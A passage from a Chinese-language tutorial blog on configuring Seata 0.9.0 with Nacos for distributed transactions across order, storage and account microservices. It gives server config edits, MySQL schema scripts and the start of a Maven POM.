target="_blank" rel="noopener">http://seata.io/zh-cn/</a></p><p>下载版本 - 0.9.0</p><p>seata-server-0.9.0.zip解压到指定目录并修改conf目录下的file.conf配置文件</p><p>先备份原始file.conf文件</p><p>主要修改:自定义事务组名称+事务日志存储模式为db +数据库连接信息</p><p>file.conf</p><p>service模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">service &#123;</span><br><span class="line">    ##fsp_tx_group是自定义的</span><br><span class="line">    vgroup_mapping.my.test.tx_group&#x3D;&quot;fsp_tx_group&quot; </span><br><span class="line">    default.grouplist &#x3D; &quot;127.0.0.1:8091&quot;</span><br><span class="line">    enableDegrade &#x3D; false</span><br><span class="line">    disable &#x3D; false</span><br><span class="line">    max.commitretry.timeout&#x3D; &quot;-1&quot;</span><br><span class="line">    max.ollbackretry.timeout&#x3D; &quot;-1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>store模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">## transaction log store</span><br><span class="line">store &#123;</span><br><span class="line">## store mode: file, db</span><br><span class="line">## 改成db</span><br><span class="line">mode &#x3D; &quot;db&quot;</span><br><span class="line"></span><br><span class="line">## file store</span><br><span class="line">file &#123;</span><br><span class="line">dir &#x3D; &quot;sessionStore&quot;</span><br><span class="line"></span><br><span class="line"># branch session size, if exceeded first try compress lockkey, still exceeded throws exceptions</span><br><span class="line">max-branch-session-size &#x3D; 16384</span><br><span class="line"># globe session size, if exceeded throws exceptions</span><br><span class="line">max-global-session-size &#x3D; 512</span><br><span class="line"># file buffer size, if exceeded allocate new buffer</span><br><span class="line">file-write-buffer-cache-size &#x3D; 16384</span><br><span class="line"># when recover batch read size</span><br><span class="line">session.reload.read_size&#x3D; 100</span><br><span class="line"># async, sync</span><br><span class="line">flush-disk-mode &#x3D; async</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># database store</span><br><span class="line">db &#123;</span><br><span class="line">## the implement of javax.sql.DataSource, such as DruidDataSource(druid)&#x2F;BasicDataSource(dbcp) etc.</span><br><span class="line">datasource &#x3D; &quot;dbcp&quot;</span><br><span class="line">## mysql&#x2F;oracle&#x2F;h2&#x2F;oceanbase etc.</span><br><span class="line">## 配置数据源</span><br><span class="line">db-type &#x3D; &quot;mysql&quot;</span><br><span class="line">driver-class-name &#x3D; &quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">url &#x3D; &quot;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;seata&quot;</span><br><span class="line">user &#x3D; &quot;root&quot;</span><br><span class="line">password &#x3D; &quot;你自己密码&quot;</span><br><span class="line">min-conn&#x3D; 1</span><br><span class="line">max-conn &#x3D; 3</span><br><span class="line">global.table &#x3D; &quot;global_table&quot;</span><br><span class="line">branch.table &#x3D; &quot;branch_table&quot;</span><br><span class="line">lock-table &#x3D; &quot;lock_table&quot;</span><br><span class="line">query-limit &#x3D; 100</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mysql5.7数据库新建库seata，在seata库里建表</p><p>建表db_store.sql在\seata-server-0.9.0\seata\conf目录里面</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- the table to store GlobalSession data</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`global_table`</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`global_table`</span> (</span><br><span class="line">  <span class="string">`xid`</span> <span class="built_in">varchar</span>(<span class="number">128</span>)  <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="string">`transaction_id`</span> <span class="built_in">bigint</span>,</span><br><span class="line">  <span class="string">`status`</span> <span class="built_in">tinyint</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="string">`application_id`</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</span><br><span class="line">  <span class="string">`transaction_service_group`</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</span><br><span class="line">  <span class="string">`transaction_name`</span> <span class="built_in">varchar</span>(<span class="number">128</span>),</span><br><span class="line">  <span class="string">`timeout`</span> <span class="built_in">int</span>,</span><br><span class="line">  <span class="string">`begin_time`</span> <span class="built_in">bigint</span>,</span><br><span class="line">  <span class="string">`application_data`</span> <span class="built_in">varchar</span>(<span class="number">2000</span>),</span><br><span class="line">  <span class="string">`gmt_create`</span> datetime,</span><br><span class="line">  <span class="string">`gmt_modified`</span> datetime,</span><br><span class="line">  primary <span class="keyword">key</span> (<span class="string">`xid`</span>),</span><br><span class="line">  <span class="keyword">key</span> <span class="string">`idx_gmt_modified_status`</span> (<span class="string">`gmt_modified`</span>, <span class="string">`status`</span>),</span><br><span class="line">  <span class="keyword">key</span> <span class="string">`idx_transaction_id`</span> (<span class="string">`transaction_id`</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- the table to store BranchSession data</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`branch_table`</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`branch_table`</span> (</span><br><span class="line">  <span class="string">`branch_id`</span> <span class="built_in">bigint</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="string">`xid`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="string">`transaction_id`</span> <span class="built_in">bigint</span> ,</span><br><span class="line">  <span class="string">`resource_group_id`</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</span><br><span class="line">  <span class="string">`resource_id`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) ,</span><br><span class="line">  <span class="string">`lock_key`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) ,</span><br><span class="line">  <span class="string">`branch_type`</span> <span class="built_in">varchar</span>(<span class="number">8</span>) ,</span><br><span class="line">  <span class="string">`status`</span> <span class="built_in">tinyint</span>,</span><br><span class="line">  <span class="string">`client_id`</span> <span class="built_in">varchar</span>(<span class="number">64</span>),</span><br><span class="line">  <span class="string">`application_data`</span> <span class="built_in">varchar</span>(<span class="number">2000</span>),</span><br><span class="line">  <span class="string">`gmt_create`</span> datetime,</span><br><span class="line">  <span class="string">`gmt_modified`</span> datetime,</span><br><span class="line">  primary <span class="keyword">key</span> (<span class="string">`branch_id`</span>),</span><br><span class="line">  <span class="keyword">key</span> <span class="string">`idx_xid`</span> (<span class="string">`xid`</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- the table to store lock data</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`lock_table`</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`lock_table`</span> (</span><br><span class="line">  <span class="string">`row_key`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="string">`xid`</span> <span class="built_in">varchar</span>(<span class="number">96</span>),</span><br><span class="line">  <span class="string">`transaction_id`</span> <span class="keyword">long</span> ,</span><br><span class="line">  <span class="string">`branch_id`</span> <span class="keyword">long</span>,</span><br><span class="line">  <span class="string">`resource_id`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) ,</span><br><span class="line">  <span class="string">`table_name`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) ,</span><br><span class="line">  <span class="string">`pk`</span> <span class="built_in">varchar</span>(<span class="number">36</span>) ,</span><br><span class="line">  <span class="string">`gmt_create`</span> datetime ,</span><br><span class="line">  <span class="string">`gmt_modified`</span> datetime,</span><br><span class="line">  primary <span class="keyword">key</span>(<span class="string">`row_key`</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>修改seata-server-0.9.0\seata\conf目录下的registry.conf配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">registry &#123;</span><br><span class="line">  # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa</span><br><span class="line">  # 改用为nacos</span><br><span class="line">  type &#x3D; &quot;nacos&quot;</span><br><span class="line"></span><br><span class="line">  nacos &#123;</span><br><span class="line">  ## 加端口号</span><br><span class="line">    serverAddr &#x3D; &quot;localhost:8848&quot;</span><br><span class="line">    namespace &#x3D; &quot;&quot;</span><br><span class="line">    cluster &#x3D; &quot;default&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是：指明注册中心为nacos，及修改nacos连接信息</p><p>先启动Nacos端口号8848 nacos\bin\startup.cmd</p><p>再启动seata-server - seata-server-0.9.0\seata\bin\seata-server.bat</p><h2 id="Seata业务数据库准备"><a href="#Seata业务数据库准备" class="headerlink" title="Seata业务数据库准备"></a>Seata业务数据库准备</h2><p>以下演示都需要先启动Nacos后启动Seata,保证两个都OK。</p><p>分布式事务业务说明</p><p>这里我们会创建三个服务，一个订单服务，一个库存服务，一个账户服务。</p><p>当用户下单时,会在订单服务中创建一个订单, 然后通过远程调用库存服务来扣减下单商品的库存，再通过远程调用账户服务来扣减用户账户里面的余额，最后在订单服务中修改订单状态为已完成。</p><p>该操作跨越三个数据库，有两次远程调用，很明显会有分布式事务问题。</p><p>一言蔽之，下订单—&gt;扣库存—&gt;减账户(余额)。</p><p>创建业务数据库</p><ul><li>seata_ order：存储订单的数据库;</li><li>seata_ storage：存储库存的数据库;</li><li>seata_ account：存储账户信息的数据库。</li></ul><p>建库SQL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> seata_order;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> seata_storage;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> seata_account;</span><br></pre></td></tr></table></figure><p>按照上述3库分别建对应业务表</p><ul><li>seata_order库下建t_order表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t_order (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">BIGINT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">    <span class="string">`user_id`</span> <span class="built_in">BIGINT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'用户id'</span>,</span><br><span class="line">    <span class="string">`product_id`</span> <span class="built_in">BIGINT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'产品id'</span>,</span><br><span class="line">    <span class="string">`count`</span> <span class="built_in">INT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'数量'</span>,</span><br><span class="line">    <span class="string">`money`</span> <span class="built_in">DECIMAL</span>(<span class="number">11</span>,<span class="number">0</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'金额'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">INT</span>(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'订单状态: 0:创建中; 1:已完结'</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">INNODB</span> AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t_order;</span><br></pre></td></tr></table></figure><ul><li>seata_storage库下建t_storage表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t_storage (</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">BIGINT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line"><span class="string">`product_id`</span> <span class="built_in">BIGINT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'产品id'</span>,</span><br><span class="line"><span class="string">`total`</span> <span class="built_in">INT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'总库存'</span>,</span><br><span class="line"><span class="string">`used`</span> <span class="built_in">INT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'已用库存'</span>,</span><br><span class="line"><span class="string">`residue`</span> <span class="built_in">INT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'剩余库存'</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">INNODB</span> AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> seata_storage.t_storage(<span class="string">`id`</span>, <span class="string">`product_id`</span>, <span class="string">`total`</span>, <span class="string">`used`</span>, <span class="string">`residue`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'100'</span>, <span class="string">'0'</span>,<span class="string">'100'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t_storage;</span><br></pre></td></tr></table></figure><ul><li>seata_account库下建t_account表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t_account(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">BIGINT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT PRIMARY <span class="keyword">KEY</span> <span class="keyword">COMMENT</span> <span class="string">'id'</span>,</span><br><span class="line"><span class="string">`user_id`</span> <span class="built_in">BIGINT</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'用户id'</span>,</span><br><span class="line"><span class="string">`total`</span> <span class="built_in">DECIMAL</span>(<span class="number">10</span>,<span class="number">0</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'总额度'</span>,</span><br><span class="line"><span class="string">`used`</span> <span class="built_in">DECIMAL</span>(<span class="number">10</span>,<span class="number">0</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'已用余额'</span>,</span><br><span class="line"><span class="string">`residue`</span> <span class="built_in">DECIMAL</span>(<span class="number">10</span>,<span class="number">0</span>) <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'剩余可用额度'</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">INNODB</span> AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> seata_account.t_account(<span class="string">`id`</span>, <span class="string">`user_id`</span>, <span class="string">`total`</span>, <span class="string">`used`</span>, <span class="string">`residue`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'1000'</span>, <span class="string">'0'</span>, <span class="string">'1000'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t_account;</span><br></pre></td></tr></table></figure><p>按照上述3库分别建对应的回滚日志表</p><ul><li>订单-库存-账户3个库下<strong>都需要建各自的回滚日志表</strong></li><li>\seata-server-0.9.0\seata\conf目录下的db<em> undo</em> log.sql</li><li>建表SQL</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- the table to store seata xid data</span></span><br><span class="line"><span class="comment">-- 0.7.0+ add context</span></span><br><span class="line"><span class="comment">-- you must to init this sql for you business databese. the seata server not need it.</span></span><br><span class="line"><span class="comment">-- 此脚本必须初始化在你当前的业务数据库中，用于AT 模式XID记录。与server端无关（注：业务数据库）</span></span><br><span class="line"><span class="comment">-- 注意此处0.3.0+ 增加唯一索引 ux_undo_log</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="string">`undo_log`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`undo_log`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`branch_id`</span> <span class="built_in">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`xid`</span> <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`context`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`rollback_info`</span> longblob <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`log_status`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`log_created`</span> datetime <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`log_modified`</span> datetime <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`ext`</span> <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`ux_undo_log`</span> (<span class="string">`xid`</span>,<span class="string">`branch_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure><h2 id="Seata之Order-Module配置搭建"><a href="#Seata之Order-Module配置搭建" class="headerlink" title="Seata之Order-Module配置搭建"></a>Seata之Order-Module配置搭建</h2><p>下订单 -&gt; 减库存 -&gt; 扣余额 -&gt; 改（订单）状态</p><p>seata-order-service2001</p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud2020<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-order-service2001<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--nacos--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--seata--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-seata<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--feign--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--web-actuator--&gt;</span></span><br><span class="line">        <span 